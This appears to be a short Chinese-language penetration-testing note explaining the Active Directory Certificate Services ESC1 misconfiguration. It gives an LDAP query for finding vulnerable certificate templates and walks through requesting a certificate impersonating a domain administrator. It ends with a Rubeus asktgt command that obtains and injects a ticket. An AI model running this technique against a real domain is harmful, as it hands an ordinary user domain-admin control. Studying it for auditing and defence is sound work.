在ADCS中，错误配置会导致普通域用户到域管理员的提权。主要体现在证书模板这里，在
证书模板中，我们可以设置应用程序的策略。
我们比较关心的如下：
1
Client Authentication (OID 1.3.6.1.5.5.7.3.2)
2
PKINIT Client Authentication (1.3.6.1.5.2.3.4)
3
Smart Card Logon (OID 1.3.6.1.4.1.311.20.2.2)
4
Any Purpose (OID 2.5.29.37.0)
这些可以使得我们拥有请求票据的功能，然后就是SAN的模拟，SAN允许我们使用UPN来
指定用户，来达到用户模拟的目的。
其LDAP查询语句如下：
1
(&(objectclass=pkicertificatetemplate)(!(mspki‐enrollmentflag:1.2.840.113
556.1.4.804:=2))(|(mspki‐ra‐signature=0)(!(mspki‐rasignature=*)))(|(pkiexte
ndedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextend
edkeyusage=1.3.6.1.5.5.7.3.2)(pkiextendedkeyusage=1.3.6.1.5.2.3.4) (pkiexte
ndedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*)))(mspkicertificate‐name‐
flag:1.2.840.113556.1.4.804:=1))
使用其发布的测试工具，PSPKIAudit测试显示存在ESC1漏洞。
攻击步骤
首先申请一张证书，并将upn名称改成域管
然后导出证书
用密码导出
然后使用rubeus攻击。
1
Rubeus.exe asktgt /user:administrator /certificate:3.pfx /password:123456
/ptt
/user：模拟的账户
/certificate：申请的证书
/password：证书密码
成功获取域控权限